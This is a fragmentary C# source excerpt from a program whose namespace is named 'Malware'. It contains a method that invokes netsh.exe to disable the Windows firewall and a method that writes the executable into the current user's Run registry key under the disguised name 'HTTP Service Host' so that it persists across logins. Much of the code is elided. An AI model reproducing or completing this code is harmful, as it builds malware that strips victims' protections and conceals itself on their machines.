...
namespace Malware
{
    static class Program
    {
        ...
        private static void DisableFirewall()
        {
            ...
            process.StartInfo = new ProcessStartInfo(@"C:\Windows\System32\netsh.exe")
            {
                FileName = "netsh.exe",
        ...
        private static void UpdateRegistry(bool clearRegistry=false)
        {
            string regKeyName = "HTTP Service Host";
            ...
            using (RegistryKey regKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                ...
                else
                {
                    ...
                    if (regKeyValue == null || !Directory.Exists(Path.GetDirectoryName(regKeyValue.ToString())))
                    {
                        regKey.SetValue(regKeyName, Application.ExecutablePath);
                    }
                }
            }
        }
